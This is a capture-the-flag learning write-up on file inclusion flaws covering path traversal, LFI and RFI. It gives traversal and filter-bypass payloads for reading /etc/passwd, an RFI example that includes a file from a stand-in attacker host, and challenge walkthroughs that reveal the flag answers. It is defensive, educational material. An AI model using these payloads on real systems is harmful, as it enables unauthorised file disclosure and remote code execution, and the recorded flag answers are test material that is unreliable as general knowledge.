# File Inclusion

<img width="1302" height="88" alt="image" src="https://github.com/user-attachments/assets/c34a6eb8-860e-4c80-9597-f3a55c173782" />

## My Key TakeHomes From The Room

- Essential knowledge to exploit file inclusion vulnerabilities, including
  - Local File Inclusion (LFI),
  - Remote File Inclusion (RFI), and
  - Directory traversal.

- Understanding of the risk of these vulnerabilities if they're found and the required remediation.
- In some scenarios, web applications are written to request access to files on a given system via parameters.
- Parameters are query strings attached to the URL that could be used to retrieve data or perform actions based on user input

<img width="717" height="342" alt="image" src="https://github.com/user-attachments/assets/de145a95-dab4-40e3-9160-9dd6f7c80ef9" />

<img width="1059" height="501" alt="image" src="https://github.com/user-attachments/assets/edc30620-3b89-4b09-909f-b36a4e887a0f" />


- File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applicationsthat are poorly written and implemented.
  
- Input validation, in which the user inputs are not sanitized or validated, and the user controls them can allow the user can pass any input to the function, causing the vulnerability.
 
- By default, attackers leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the webApp or OS.
-  If the attacker can write files to the server by any other means, file inclusion might be used to gain remote command execution (RCE).

---

### Path Transversal/Directory Transversal

A web security vulnerability allows an attacker to read OS resources like local files on the server running an application. 

Attackers exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as ```**file_get_contents**```  in PHP (used to read the contents of a file) attributed to poor input validation or filtering. 

A web application stores files in ```**/var/www/app**``` and here is the path of a user requesting the contents of ```userCV.pdf``` from a defined path ```**/var/www/app/CVs**```'

<img width="1343" height="560" alt="image" src="https://github.com/user-attachments/assets/8cf9786d-f46e-47a2-95a6-57ecdadffa5c" />

**Dot-Dot-Slash attack**

A Path traversal attack that take advantage of moving the directory one step up using the double dots ```../```.

By this, the attacker can test out the URL parameter by adding payloads to see how the web application behaves.  

For instance, if the attacker finds the entry point, which in this case **get.php?file=,** then the he may send something like, [http://webapp.thm/get.php?file=../../../../etc/passwd]()

For this case, if there isn't input validation, instead of accessing the PDF files at **/var/www/app/CVs** location, the web application retrieves files from other directories and presents the **/etc/passwd** to the attacker. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.


<img width="713" height="598" alt="image" src="https://github.com/user-attachments/assets/98668fd9-a6ad-468b-99bc-2af0640a794e" />

<img width="1255" height="600" alt="image" src="https://github.com/user-attachments/assets/5a388a9b-8f7b-4b1d-aae4-624281260f8d" />



Similarly, if the web application runs on a Windows server, the same concept applies as with Linux OS, where we climb up directories until it reaches the root directory, as we provide Windows paths. 

For example, to read the **boot.ini** file located in **c:\boot.ini,** then the attacker can try the following:

http://webapp.thm/get.php?file=../../../../boot.ini 

or

http://webapp.thm/get.php?file=../../../../windows/win.ini


As a remediation, developers needs to add filters to limit access to only certain files or directories. 

Some common OS files a penetration tester can use when testing:

<img width="708" height="607" alt="image" src="https://github.com/user-attachments/assets/11996010-9de9-480f-922f-832c00f4f38b" />

 
---

### Local File Inclusion (LFI)
  
LFI attacks against web applications are often due to a developers' lack of security awareness. 

With PHP, using functions such as ```*include, require, include_once,*``` and ```*require_once*``` often contribute to vulnerable web applications.

LFI vulnerabilities not only occur on PHP, they also occur when using other languages such as ASP, JSP, or even in Node.js but  the LFI  exploits follow the same concepts as path traversal.

**various LFI scenarios and how to exploit them.**:

A. **Scenario #1:** <br>Suppose the web application provides two languages, and the user can select between the EN and AR

```
<?PHP 
	include($_GET["lang"]);
?>
 ```

The PHP code above uses a **GET** request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where ```**EN.php**``` and ```**AR.php**``` files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation.

To read the **/etc/passwd** file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd

In this case, it works because there isn't a directory specified in the include function and no input validation.

We now apply this and try to read ```**/etc/passwd file**```. 

<img width="920" height="558" alt="image" src="https://github.com/user-attachments/assets/6aa3fa00-8c8a-4770-bbf5-05e5af0ade9f" />



B. **Scenario #2:** <br> Next, In the following code, the developer decided to specify the directory inside the function.

 
```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as ```/etc/passwd.```

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. 

The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd

---

C. **Scenario #3:** <br> No source code thus we do a black box testing depending on the errors to understand how data is passed and processed into the web app.


In this scenario, we have the entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error

<img width="814" height="576" alt="image" src="https://github.com/user-attachments/assets/c1f998ea-3ea0-47b1-8dad-5b33bdf8d82b" />

The error message discloses significant information:

1. The include function looks like: ```*include(languages/THM.php);*.``` This shows the function includes files in the ```*languages directory*``` is adding ```**.php**``` at the end of the entry. Thus the valid input will be something as follows: ```*index.php?lang=EN,*``` where the file EN is located inside the given languages directory and named ```EN.php.```

2. The full web application directory path which is ```*/var/www/html/THM-4/.*```

To exploit this, we need to use the ```../``` trick, to get out the current folder:

http://webapp.thm/index.php?lang=../../../../etc/passwd

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. 

But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
<img width="811" height="570" alt="image" src="https://github.com/user-attachments/assets/74ed94c2-3787-4500-942d-5c9d2e3bf88d" />


It seems we could move out of the PHP directory but still, the include function reads the input with **.php** at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.

**Using null bytes** is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like:

```include("languages/../../../../../etc/passwd%00").".php");``` which is equivalent to ```include("languages/../../../../../etc/passwd");```

Note: the %00 trick is fixed and not working with PHP 5.3.4 and above.

<img width="768" height="600" alt="image" src="https://github.com/user-attachments/assets/be2831aa-1331-466b-8e00-7ac715f1c8bd" />




D. **Scenario #4:** <br> The developer has filtered keywords to avoid disclosing sensitive information! The ```*/etc/passwd*``` file is being filtered. 

Two possible methods to bypass the filter:

1. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword ```/..```

The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. 

We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.

To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory. Similarly, if we try ```/etc/passwd/..```, it results to be /etc/ and that's because we moved one to the root. Now if we try ```/etc/passwd```/., the result will be /etc/passwd since dot refers to the current directory.



E. **scenario #5:** <br> The developer starts to use input validation by filtering some keywords. 

We test out and check the error message!

http://webapp.thm/index.php?lang=../../../../etc/passwd

We got the following error!

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ```../``` with the empty string. 

There are a couple of techniques we can use to bypass this:

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd.

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving the below:

<img width="975" height="354" alt="image" src="https://github.com/user-attachments/assets/fac64a58-96aa-41be-b95a-78ca20be9063" />


F. **Scenario #6:** <br> The developer forces the include to read from a defined directory! 

For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: 

```
?lang=languages/../../../../../etc/passwd.
```
<img width="784" height="500" alt="image" src="https://github.com/user-attachments/assets/b29d60f2-7362-458c-987c-52132eee2f58" />


---

### **Remote File Inclusion(RFI)**

A technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the *allow_url_fopen* option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. 

Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

**RFI steps for a successful RFI attack!**

<img width="1018" height="609" alt="image" src="https://github.com/user-attachments/assets/2819ecd2-38fc-4f25-bb88-271e7536a1a1" />



Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.

```
<?PHP echo "Hello THM"; ?>
```

1. First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt.
2. If there is no input validation, then the malicious URL passes into the include function.
3. Next, the web app server will send a GET request to the malicious server to fetch the file.

As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.


---

### **Remediation:**

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

- Keep system and services, including web application frameworks, updated with the latest version.
- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
- A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
- Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as ```*allow_url_fopen*``` on and ```*allow_url_include.*```
- Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
- Never trust user input, and make sure to implement proper input validation against file inclusion.
- Implement whitelisting for file names and locations as well as blacklisting.

---

### **CHALLENGE**

**Steps for testing for LFI**
1. Find an entry point that could be via ```GET, POST, COOKIE,``` or ```HTTP``` header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files

Working through the challenges:

<img width="995" height="530" alt="image" src="https://github.com/user-attachments/assets/9e797ac6-7628-46a3-87ab-8325b8296d86" />


**A. Capture Flag1 at /etc/flag1: ```F1x3d-iNpu7-f0rrn```**
_______________________
<img width="962" height="292" alt="image" src="https://github.com/user-attachments/assets/d0a41f27-aadc-44d5-b02d-1684469cb95e" />

1. Inspect the page
<img width="996" height="246" alt="image" src="https://github.com/user-attachments/assets/2a5d30a3-e7a7-411c-8e73-ce1b20ee1427" />

<img width="997" height="240" alt="image" src="https://github.com/user-attachments/assets/6d31d5b9-0d71-4485-9fae-03d030890d87" />

2. Right click the GET request and Choose 'Edit and Resend'

<img width="997" height="457" alt="image" src="https://github.com/user-attachments/assets/218e064b-9430-4293-8e2e-c721a152f196" />

3. Change ```GET``` to ```POST```
4. Add another field with the below Name:Value
   Name: ```Content-Type```
   Value: ```application/x-www-form-urlencoded```
5. Add in the body (payload) section
   ```file=/etc/flag1```

<img width="992" height="556" alt="image" src="https://github.com/user-attachments/assets/bcfbb017-488d-4116-b558-018bb4000c60" />

5.Send payload and view response to see the first flag.

<img width="998" height="451" alt="image" src="https://github.com/user-attachments/assets/52531d2d-9d1e-4ca7-b552-731dfd16682a" />


We can also use the curl command on terminal

```
curl -X POST -d "file=/etc/flag1/" http://10.129.172.233/challenges/chall1.php

```

**B. Capture Flag2 at /etc/flag2: ```c00k13_i5_yuMmy1```**

Hint:

<img width="387" height="71" alt="image" src="https://github.com/user-attachments/assets/51a915ca-3308-43e2-b631-d47de472f6e5" />

_______________________

<img width="993" height="326" alt="image" src="https://github.com/user-attachments/assets/b3617eef-b3a1-4fe9-b595-f68d265c0516" />

1. Refresh the page.
2. Inspect the page.

<img width="919" height="342" alt="image" src="https://github.com/user-attachments/assets/5b67bc45-0dda-4e3e-a890-05a5c3990077" />
   
3. Inspect the THM session cookie in the storage tab

<img width="999" height="166" alt="image" src="https://github.com/user-attachments/assets/376d7063-a490-47b6-afa7-b662edcde331" />


4. Change the Cookie Value from Guest to Admin
   This helps us discover our current path: ``/var/www/html``

<img width="993" height="481" alt="image" src="https://github.com/user-attachments/assets/c53bfa47-a991-458f-ac7d-1d41d2ea353c" />



5. We then change the THM Cookie value with the payload: ../../../..//etc/flag2%00



**C. Capture Flag3 at /etc/flag3: P0st_1s_w0rk1in9**

Hint:

<img width="388" height="96" alt="image" src="https://github.com/user-attachments/assets/1be00683-7e4f-43cf-9428-78c19bf3c736" />

_______________________

Inspect the page and click on Inspector. Replace, GET with POST and refresh the page. Use burp and in the file paramater enter: ../../../../etc/flag3%00, and finally after forwarding the request, you will get the flag


**D. Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output? lfi-vm-thm-f8c5b1a78692**

_______________________


To execute a hostname command, first we create a php hostname file in our system locally and save it. The contents of the file will look like:

<img width="443" height="69" alt="image" src="https://github.com/user-attachments/assets/a3d33cef-7c2a-47e8-8137-73b98ff1f2b8" />


Then we need to start a server, which can be done with the following command: python3 -m http.server 9000.

Finally, in the challenge input paramater we can run the below command to execute Remote Code Execution.
